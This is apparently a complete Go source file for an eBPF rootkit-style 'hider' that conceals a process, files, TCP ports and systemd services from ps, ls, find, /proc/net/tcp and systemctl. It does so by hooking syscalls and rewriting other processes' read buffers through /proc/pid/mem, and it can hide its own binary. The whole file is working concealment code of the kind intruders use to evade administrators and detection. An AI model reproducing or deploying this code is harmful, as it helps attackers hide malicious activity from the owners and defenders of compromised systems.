// SPDX-License-Identifier: GPL-2.0
// ebpf-hide-proc: hide processes, files, network connections and systemd services
// using eBPF + /proc/pid/mem patching
//
// Hiding mechanisms:
//   1. Process hiding: getdents64 hook + /proc/pid/mem patching
//   2. File hiding: same getdents64 hook
//   3. Network hiding (/proc/net/tcp): kprobe tcp4/6_seq_show + read tracepoint
//   4. Systemd service hiding: write(stdout) tracepoint + service file hiding

package main

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -cflags "-O2 -g -Wall -target bpf" -target amd64 hideProc ./bpf/hide_proc.c

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

const nameMax = 64

const (
	evtHidePID  = 1
	evtHideFile = 2
	evtHideNet  = 3 // /proc/net/tcp
	evtHideSvc  = 4 // systemctl output scrubbing
)

// Dirent hide event
type hideEvent struct {
	EvtType   uint8
	Pad0      [3]byte
	CallerPID uint32
	CallerTID uint32
	Pad1      uint32
	BufAddr   uint64
	EntryOff  uint64
	EntryRecl uint16
	PrevRecl  uint16
	Pad2      uint32
	PrevOff   uint64
	TotalSize int64
	DName     [nameMax]byte
}

// Network hide event
type netHideEvent struct {
	EvtType    uint8
	Pad0       [3]byte
	CallerPID  uint32
	CallerTID  uint32
	LocalPort  uint16
	RemotePort uint16
	BufAddr    uint64
	BufLen     int64
}

// Service output hide event
type svcHideEvent struct {
	EvtType   uint8
	Pad0      [3]byte
	CallerPID uint32
	CallerTID uint32
	Pad1      uint32
	BufAddr   uint64
	BufLen    int64
}

// Multi-value flags
type stringSlice []string

func (s *stringSlice) String() string { return strings.Join(*s, ", ") }
func (s *stringSlice) Set(v string) error {
	*s = append(*s, v)
	return nil
}

type intSlice []int

func (s *intSlice) String() string {
	strs := make([]string, len(*s))
	for i, v := range *s {
		strs[i] = strconv.Itoa(v)
	}
	return strings.Join(strs, ", ")
}
func (s *intSlice) Set(v string) error {
	n, err := strconv.Atoi(v)
	if err != nil {
		return fmt.Errorf("invalid port: %s", v)
	}
	if n < 1 || n > 65535 {
		return fmt.Errorf("port out of range: %d", n)
	}
	*s = append(*s, n)
	return nil
}

func main() {
	var targetPID int
	var hideFiles stringSlice
	var hidePorts intSlice
	var hideServices stringSlice
	var hideSelfFile bool

	flag.IntVar(&targetPID, "pid", 0, "PID to hide (default: self)")
	flag.Var(&hideFiles, "hide-file", "file name to hide (repeatable)")
	flag.Var(&hidePorts, "hide-port", "TCP port to hide from /proc/net/tcp (repeatable)")
	flag.Var(&hideServices, "hide-service", "systemd service to hide (repeatable, e.g. 'test-hidden.service')")
	flag.BoolVar(&hideSelfFile, "hide-self-file", false, "hide own binary file")
	flag.Parse()

	if targetPID == 0 {
		targetPID = os.Getpid()
	}
	if hideSelfFile {
		exe, err := os.Executable()
		if err == nil {
			hideFiles = append(hideFiles, filepath.Base(exe))
		}
	}

	// Service hiding also hides the .service files from directory listings
	doSvc := len(hideServices) > 0
	if doSvc {
		for _, svc := range hideServices {
			// Add service file name to file hiding list
			hideFiles = append(hideFiles, svc)
		}
	}

	pidStr := strconv.Itoa(targetPID)
	doFile := len(hideFiles) > 0
	doNet := len(hidePorts) > 0

	log.Printf("=== eBPF Process, File, Network & Service Hider Demo ===")
	log.Printf("Target PID: %d (%s)", targetPID, pidStr)
	log.Printf("My PID:     %d", os.Getpid())
	if doFile {
		log.Printf("Hide files: %v", []string(hideFiles))
	}
	if doNet {
		log.Printf("Hide ports: %v (proc/net/tcp)", []int(hidePorts))
	}
	if doSvc {
		log.Printf("Hide services: %v (systemctl output + file hiding)", []string(hideServices))
	}

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("memlock: %v", err)
	}

	objs := hideProcObjects{}
	if err := loadHideProcObjects(&objs, nil); err != nil {
		log.Fatalf("load eBPF: %v", err)
	}
	defer objs.Close()

	// --- PID setup ---
	var pidVal, pidMask uint64
	pidBytes := []byte(pidStr + "\x00")
	for i := 0; i < len(pidBytes) && i < 8; i++ {
		pidVal |= uint64(pidBytes[i]) << (i * 8)
		pidMask |= 0xFF << (i * 8)
	}
	log.Printf("PID match: val=0x%016x mask=0x%016x", pidVal, pidMask)

	putU64 := func(m interface{ Put(any, any) error }, key uint32, val uint64) {
		buf := make([]byte, 8)
		binary.LittleEndian.PutUint64(buf, val)
		if err := m.Put(key, buf); err != nil {
			log.Fatalf("map put: %v", err)
		}
	}
	putU64(objs.PidValMap, 0, pidVal)
	putU64(objs.PidMaskMap, 0, pidMask)

	// --- File setup ---
	if doFile {
		for _, fname := range hideFiles {
			key, mask := encodeNameU64(fname)
			keyBuf := make([]byte, 8)
			maskBuf := make([]byte, 8)
			binary.LittleEndian.PutUint64(keyBuf, key)
			binary.LittleEndian.PutUint64(maskBuf, mask)
			if err := objs.FileNameMap.Put(keyBuf, maskBuf); err != nil {
				log.Fatalf("set file '%s': %v", fname, err)
			}
			log.Printf("File match: '%s' key=0x%016x", fname, key)
		}
	}

	// --- Port setup ---
	if doNet {
		for _, port := range hidePorts {
			if err := objs.HidePortsMap.Put(uint32(port), uint32(1)); err != nil {
				log.Fatalf("set port %d: %v", port, err)
			}
		}
	}

	// --- Service comm filter + name map setup ---
	if doSvc {
		// Add "systemctl" to the comm filter map
		// comm is "systemctl\0" — first 8 bytes: "systemct"
		commBytes := []byte("systemct")
		var commKey uint64
		for i := 0; i < 8 && i < len(commBytes); i++ {
			commKey |= uint64(commBytes[i]) << (i * 8)
		}
		if err := objs.SvcCommMap.Put(commKey, uint32(1)); err != nil {
			log.Fatalf("set svc comm: %v", err)
		}
		log.Printf("Service comm filter: 'systemctl' key=0x%016x", commKey)

		// Populate svc_name_map with service name prefixes (first 8 bytes)
		for _, svc := range hideServices {
			var nameKey uint64
			nameBytes := []byte(svc)
			for i := 0; i < 8 && i < len(nameBytes); i++ {
				nameKey |= uint64(nameBytes[i]) << (i * 8)
			}
			if err := objs.SvcNameMap.Put(nameKey, uint32(1)); err != nil {
				log.Fatalf("set svc name '%s': %v", svc, err)
			}
			log.Printf("Service name filter: '%s' key=0x%016x", svc, nameKey)

			// Also add without .service suffix
			base := strings.TrimSuffix(svc, ".service")
			if base != svc && len(base) > 0 {
				var baseKey uint64
				baseBytes := []byte(base)
				for i := 0; i < 8 && i < len(baseBytes); i++ {
					baseKey |= uint64(baseBytes[i]) << (i * 8)
				}
				if err := objs.SvcNameMap.Put(baseKey, uint32(1)); err != nil {
					log.Fatalf("set svc base name '%s': %v", base, err)
				}
				log.Printf("Service name filter: '%s' key=0x%016x", base, baseKey)
			}
		}
	}

	// --- Feature flags ---
	objs.FeatureMap.Put(uint32(0), uint32(1)) // PID hiding always on
	fileFlag := uint32(0)
	if doFile {
		fileFlag = 1
	}
	objs.FeatureMap.Put(uint32(1), fileFlag)
	netFlag := uint32(0)
	if doNet {
		netFlag = 1
	}
	objs.FeatureMap.Put(uint32(2), netFlag)
	svcFlag := uint32(0)
	if doSvc {
		svcFlag = 1
	}
	objs.FeatureMap.Put(uint32(3), svcFlag)

	// --- Attach getdents64 tracepoints ---
	tpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64",
		objs.TracepointSysEnterGetdents64, nil)
	if err != nil {
		log.Fatalf("attach getdents enter: %v", err)
	}
	defer tpEnter.Close()

	tpExit, err := link.Tracepoint("syscalls", "sys_exit_getdents64",
		objs.TracepointSysExitGetdents64, nil)
	if err != nil {
		log.Fatalf("attach getdents exit: %v", err)
	}
	defer tpExit.Close()

	// --- Attach network hooks ---
	if doNet {
		kp4, err := link.Kprobe("tcp4_seq_show", objs.KprobeTcp4SeqShow, nil)
		if err != nil {
			log.Fatalf("kprobe tcp4_seq_show: %v", err)
		}
		defer kp4.Close()

		kp6, err := link.Kprobe("tcp6_seq_show", objs.KprobeTcp6SeqShow, nil)
		if err != nil {
			log.Printf("kprobe tcp6_seq_show: %v (tcp6 proc hiding disabled)", err)
		} else {
			defer kp6.Close()
		}

		tpReadEnter, err := link.Tracepoint("syscalls", "sys_enter_read",
			objs.TracepointSysEnterRead, nil)
		if err != nil {
			log.Fatalf("attach read enter: %v", err)
		}
		defer tpReadEnter.Close()

		tpReadExit, err := link.Tracepoint("syscalls", "sys_exit_read",
			objs.TracepointSysExitRead, nil)
		if err != nil {
			log.Fatalf("attach read exit: %v", err)
		}
		defer tpReadExit.Close()
	}

	// --- Attach service output hiding hooks ---
	if doSvc {
		// Set up tail call: put svc_scan_chunk at index 0 of svc_progs
		if err := objs.SvcProgs.Put(uint32(0), objs.SvcScanChunk); err != nil {
			log.Fatalf("set svc tail call: %v", err)
		}
		log.Println("service: tail call prog array configured")

		tpWriteEnter, err := link.Tracepoint("syscalls", "sys_enter_write",
			objs.TracepointSysEnterWrite, nil)
		if err != nil {
			log.Fatalf("attach write enter: %v", err)
		}
		defer tpWriteEnter.Close()
		log.Println("service: sys_enter_write attached")

		tpWriteExit, err := link.Tracepoint("syscalls", "sys_exit_write",
			objs.TracepointSysExitWrite, nil)
		if err != nil {
			log.Fatalf("attach write exit: %v", err)
		}
		defer tpWriteExit.Close()
		log.Println("service: sys_exit_write attached")
	}

	rd, err := ringbuf.NewReader(objs.Events)
	if err != nil {
		log.Fatalf("ringbuf: %v", err)
	}
	defer rd.Close()

	log.Println("eBPF attached!")
	log.Println()
	log.Printf(">>> Process %d is now HIDDEN from ps / top <<<", targetPID)
	if doFile {
		log.Printf(">>> Files %v are HIDDEN from ls / find <<<", []string(hideFiles))
	}
	if doNet {
		log.Printf(">>> Ports %v are HIDDEN from cat /proc/net/tcp <<<", []int(hidePorts))
	}
	if doSvc {
		log.Printf(">>> Services %v are HIDDEN from systemctl <<<", []string(hideServices))
	}
	log.Println()
	log.Println("Press Ctrl+C to stop.")

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		log.Printf("\nStopping.")
		rd.Close()
	}()

	pidCnt, fileCnt, netCnt, svcCnt := 0, 0, 0, 0
	for {
		rec, err := rd.Read()
		if err != nil {
			if err.Error() == "ringbuf reader was closed" {
				break
			}
			continue
		}
		if len(rec.RawSample) < 1 {
			continue
		}
		evtType := rec.RawSample[0]

		switch evtType {
		case evtHidePID, evtHideFile:
			var ev hideEvent
			if err := binary.Read(bytes.NewReader(rec.RawSample),
				binary.LittleEndian, &ev); err != nil {
				continue
			}
			if patchDirent(&ev) {
				name := string(bytes.TrimRight(ev.DName[:], "\x00"))
				if evtType == evtHidePID {
					pidCnt++
					log.Printf("[hide-pid #%d] Removed '%s' from PID %d's readdir",
						pidCnt, name, ev.CallerPID)
				} else {
					fileCnt++
					log.Printf("[hide-file #%d] Removed '%s' from PID %d's readdir",
						fileCnt, name, ev.CallerPID)
				}
			}

		case evtHideNet:
			var nev netHideEvent
			if err := binary.Read(bytes.NewReader(rec.RawSample),
				binary.LittleEndian, &nev); err != nil {
				continue
			}
			if patchNetRead(&nev, hidePorts) {
				netCnt++
				log.Printf("[hide-net #%d] Scrubbed port %d from PID %d's /proc/net/tcp read",
					netCnt, nev.LocalPort, nev.CallerPID)
			}

		case evtHideSvc:
			var sev svcHideEvent
			if err := binary.Read(bytes.NewReader(rec.RawSample),
				binary.LittleEndian, &sev); err != nil {
				continue
			}
			// Patching is done in BPF via bpf_probe_write_user before write() executes.
			// This event is for logging only.
			svcCnt++
			log.Printf("[hide-svc #%d] BPF scrubbed service output from PID %d (%d bytes)",
				svcCnt, sev.CallerPID, sev.BufLen)
		}
	}
	log.Printf("Total hides: pid=%d file=%d net=%d svc=%d", pidCnt, fileCnt, netCnt, svcCnt)
}

func encodeNameU64(name string) (val, mask uint64) {
	nameBytes := []byte(name + "\x00")
	n := len(nameBytes)
	if n > 8 {
		n = 8
		nameBytes = []byte(name)[:8]
	}
	for i := 0; i < n; i++ {
		val |= uint64(nameBytes[i]) << (i * 8)
		mask |= 0xFF << (i * 8)
	}
	return
}

func patchDirent(ev *hideEvent) bool {
	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", ev.CallerPID), os.O_RDWR, 0)
	if err != nil {
		return false
	}
	defer f.Close()

	maxBad := uint64(0xFFFFFFFF00000000)
	if ev.PrevOff < maxBad && ev.PrevRecl > 0 {
		addr := int64(ev.BufAddr + ev.PrevOff + 16)
		buf := make([]byte, 2)
		if _, err := f.ReadAt(buf, addr); err != nil {
			return false
		}
		cur := binary.LittleEndian.Uint16(buf)
		binary.LittleEndian.PutUint16(buf, cur+ev.EntryRecl)
		_, err := f.WriteAt(buf, addr)
		return err == nil
	}
	_, err = f.WriteAt(make([]byte, 8), int64(ev.BufAddr+ev.EntryOff))
	return err == nil
}

// patchNetRead: patch /proc/net/tcp read buffer (text lines)
func patchNetRead(nev *netHideEvent, ports intSlice) bool {
	if nev.BufLen <= 0 || nev.BufLen > 1024*1024 {
		return false
	}
	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", nev.CallerPID), os.O_RDWR, 0)
	if err != nil {
		return false
	}
	defer f.Close()

	buf := make([]byte, nev.BufLen)
	n, err := f.ReadAt(buf, int64(nev.BufAddr))
	if err != nil || n == 0 {
		return false
	}
	buf = buf[:n]

	portHexes := make([]string, 0, len(ports))
	for _, p := range ports {
		portHexes = append(portHexes, fmt.Sprintf(":%04X ", p))
	}

	patched := false
	lines := bytes.Split(buf, []byte("\n"))
	offset := int64(0)
	for i, line := range lines {
		if len(line) == 0 {
			if i < len(lines)-1 {
				offset += 1 // just the \n
			}
			continue
		}
		lineStr := string(line)
		for _, ph := range portHexes {
			if strings.Contains(lineStr, ph) {
				replacement := bytes.Repeat([]byte(" "), len(line))
				f.WriteAt(replacement, int64(nev.BufAddr)+offset)
				patched = true
				break
			}
		}
		offset += int64(len(line)) + 1
	}
	return patched
}


